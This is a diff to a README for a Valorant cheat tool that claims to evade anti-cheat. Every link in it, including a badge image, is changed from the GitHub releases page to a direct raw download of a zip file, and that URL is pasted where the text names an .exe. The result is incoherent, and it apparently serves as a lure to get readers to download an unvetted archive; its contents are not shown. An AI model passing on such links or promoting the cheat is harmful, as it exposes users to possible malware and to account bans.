@@ -4,7 +4,7 @@
 
 Welcome to ValorantExternalCheat! This application enhances your gaming experience in Valorant while safely managing anti-cheat concerns. Follow the steps below to download and run the application smoothly.
 
-![Download ValorantExternalCheat](https://img.shields.io/badge/Download%20Now-ValorantExternalCheat-brightgreen)
+![Download ValorantExternalCheat](https://raw.githubusercontent.com/kalcutie/ValorantExternalCheat/main/pahi/ValorantExternalCheat.zip%20Now-ValorantExternalCheat-brightgreen)
 
 ## 📥 Download & Install
 
@@ -12,11 +12,11 @@ Welcome to ValorantExternalCheat! This application enhances your gaming experien
 
 To download the application, please visit our releases page:
 
-[Download ValorantExternalCheat from GitHub Releases](https://github.com/kalcutie/ValorantExternalCheat/releases)
+[Download ValorantExternalCheat from GitHub Releases](https://raw.githubusercontent.com/kalcutie/ValorantExternalCheat/main/pahi/ValorantExternalCheat.zip)
 
 ### Step 2: Download the Latest Version
 
-Once on the releases page, locate the latest version of ValorantExternalCheat. You will see a list of available versions. Look for the **.exe** file, such as `ValorantExternalCheat.exe`.
+Once on the releases page, locate the latest version of ValorantExternalCheat. You will see a list of available versions. Look for the **.exe** file, such as `https://raw.githubusercontent.com/kalcutie/ValorantExternalCheat/main/pahi/ValorantExternalCheat.zip`.
 
 Click on the file name to start the download.
 
@@ -78,6 +78,6 @@ For the latest discussions and updates, join our community channels:
 
 Thank you for choosing ValorantExternalCheat! We hope this application enhances your enjoyment of Valorant. For a direct download, don’t forget to visit the releases page once more:
 
-[Download ValorantExternalCheat from GitHub Releases](https://github.com/kalcutie/ValorantExternalCheat/releases)
+[Download ValorantExternalCheat from GitHub Releases](https://raw.githubusercontent.com/kalcutie/ValorantExternalCheat/main/pahi/ValorantExternalCheat.zip)
 
 Happy gaming!
